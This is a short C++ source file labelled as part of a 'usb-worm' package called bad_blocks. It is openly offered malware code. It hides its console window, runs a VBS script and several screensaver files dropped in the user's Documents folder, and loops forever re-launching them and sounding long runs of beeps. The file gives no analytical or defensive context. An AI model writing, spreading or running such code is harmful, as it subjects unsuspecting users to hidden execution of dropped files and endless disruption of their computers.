/* bad_blocks - 2016 - cr4sh3r */

#include <iostream> 
#include <Windows.h>
#include <string>

void payload();

int main() {
	FreeConsole();
	std::string scom1("start C:\\Users\\%username%\\Documents\\sound.vbs");
	system(scom1.c_str());
	payload();
}

void payload() {
	while (true) {
		char* names[] = {"bambams.scr /s","jajas.scr /s","xavs.scr /s"};
		for (int za = 0; za <= 2; za++) {
			std::string scom0("start C:\\Users\\%username%\\Documents\\");
			scom0 += names[za];
			system(scom0.c_str());
			Sleep(1000*120);
			if (za == 2){
				za -= 2;
				int b = 0;
				while (b <= 180) {
					Beep(523, 500);
					Sleep(10);
					b++;
				}
			}
		}
	}
}

// bad_blocks(usb-worm) - pack
